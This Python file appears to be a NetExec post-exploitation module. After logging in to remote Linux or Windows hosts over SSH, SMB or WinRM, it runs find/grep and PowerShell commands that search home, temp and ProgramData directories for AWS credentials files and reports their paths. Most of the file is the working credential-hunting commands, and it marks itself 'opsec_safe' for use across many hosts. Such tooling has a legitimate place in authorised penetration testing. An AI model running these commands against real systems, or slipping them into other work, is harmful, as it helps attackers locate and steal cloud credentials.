class NXCModule:
    """
    Search for aws credentials files on linux and windows machines

    Module by Fortress
    """

    name = "aws-credentials"
    description = "Search for aws credentials files."
    supported_protocols = ["ssh", "smb", "winrm"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.search_path_linux = "'/home/' '/tmp/'"
        self.search_path_win = "'C:\\Users\\', 'C:\\ProgramData\\AWSCLI\\', 'C:\\Temp\\'"
        

    def options(self, context, module_options):
        r"""
        SEARCH_PATH_LINUX	Linux location where to search for aws credentials related files
                        	Default: '/home/ - /tmp/'
        
        SEARCH_PATH_WIN		Windows locations where to search for aws credentials related files
                        	Default: 'C:\\Users\\ - C:\\ProgramData\\AWSCLI\\ - C:\\Temp\\                        	
        """
        if "SEARCH_PATH_LINUX" in module_options:
            self.search_path_linux = module_options["SEARCH_PATH_LINUX"]

        if "SEARCH_PATH_WIN" in module_options:
            self.search_path_win = module_options["SEARCH_PATH_WIN"]

    def on_login(self, context, connection):	
	# search for aws_credentials-related files on linux systems
        if "ssh" in context.protocol:
            search_aws_creds_files_payload = "find %s -type f -name credentials -exec grep -l 'aws_' {} \\; 2>&1 | grep -v 'Permission denied$'" % (self.search_path_linux)
            search_aws_creds_files_cmd = f'/bin/bash -c "{search_aws_creds_files_payload}"'
            search_aws_creds_files_output = connection.execute(search_aws_creds_files_cmd, False)
            context.log.highlight(f"The following files were found: {search_aws_creds_files_output}")
        else:
           # search for aws_credentials-related files on windows systems
           search_aws_creds_files_payload_win = "Get-ChildItem -Path %s -Recurse -Force -Include 'credentials' -File -ErrorAction SilentlyContinue | Where-Object { Select-String -Path $_.FullName -Pattern 'aws' -Quiet } | Select-Object -ExpandProperty FullName" % (self.search_path_win)
           search_aws_creds_files_cmd_win = f'powershell.exe "{search_aws_creds_files_payload_win}"'
           search_aws_creds_files_output_win = connection.execute(search_aws_creds_files_cmd_win, False)
           context.log.highlight(f"The following files were found: {search_aws_creds_files_output_win}")
